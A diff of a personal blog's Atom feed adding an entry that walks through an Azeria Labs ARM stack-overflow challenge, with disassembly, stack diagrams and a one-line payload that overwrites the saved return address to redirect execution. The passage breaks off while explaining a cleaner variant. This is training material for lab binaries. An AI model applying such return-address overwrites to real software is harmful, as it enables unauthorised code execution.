@@ -1,4 +1,229 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-20T04:26:20+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part IV</title><link href="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part IV" /><published>2021-01-19T00:00:00+01:00</published><updated>2021-01-19T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html">&lt;p&gt;This time the goal is to make the program print the message
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-21T04:03:41+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part V</title><link href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part V" /><published>2021-01-20T00:00:00+01:00</published><updated>2021-01-20T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">&lt;p&gt;&lt;a href=&quot;https://github.com/azeria-labs/ARM-challenges&quot;&gt;Fifth challenge&lt;/a&gt;
+with a small introduction to &lt;em&gt;process continuation&lt;/em&gt;.&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;planning-the-exploit&quot;&gt;Planning the exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10464&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10468&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1046c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10470&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10474&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10478&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1047c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10480&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10488&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1048c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sub r3, fp, #0x44&lt;/code&gt; means that the buffer begins 0x44 bytes from &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt;,
+the begin of the stack frame.&lt;/p&gt;
+
+&lt;p&gt;As we saw &lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html&quot;&gt;previously&lt;/a&gt;,
+the stack frame includes the &lt;em&gt;previous&lt;/em&gt; value
+of &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; but not &lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt; which it is &lt;em&gt;immediately below&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;So a buffer overflow of 0x44 bytes will overwrite the stored &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and an
+overflow of 0x48 will overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If we do the latter, the function &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; will jump to
+our own code on &lt;em&gt;return&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-5198f64a60eca243a2249c4909487aed&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-5198f64a60eca243a2249c4909487aed&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;The left diagram shows the stack from lower
+addresses (left) to higher addresses (right) and the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;'s and
+&lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt;'s stack frames (&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt; for short)
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.......&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see the &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt; are stored in the stack as well as an
+unknown local variables of &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;When the overflow occurs this is the result:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;---------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.......&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;---------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;AAAAAAA&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;addr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No more crazy stuff is needed here, we can jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;addr1 == 0x1044c&lt;/code&gt;)
+directly.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit-level-1&quot;&gt;Exploit level 1&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4c\x04\x01\x00'&lt;/span&gt; | ./stack4
+code flow successfully changed
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yeah! but that segfault looks sloppy.&lt;/p&gt;
+
+&lt;h2 id=&quot;a-more-polite-exploit&quot;&gt;A more &lt;em&gt;polite&lt;/em&gt; exploit&lt;/h2&gt;
+
+&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; executes it will pop from the stack the stored
+&lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt; and set it into &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We didn’t call &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;bl&lt;/code&gt; or similar so the &lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt; was never
+set correctly and the value pushed in the stack by &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; was garbage.&lt;/p&gt;
+
+&lt;p&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; returns will jump to who-knows-where.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;---------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.......&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;----------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;called&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                  &lt;span class=&quot;err&quot;&gt;^&lt;/span&gt;
+                  &lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And if we don’t jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; exactly?&lt;/p&gt;
+
+&lt;p&gt;We could jump to the second instruction of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt;:
+we will be &lt;strong&gt;skipping&lt;/strong&gt; the &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1044c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10450&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10454&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10458&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x1045c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this way we can &lt;em&gt;emulate&lt;/em&gt; the &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lr&lt;/code&gt; adding 8 bytes
+to our payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;---------------&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;---------&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;
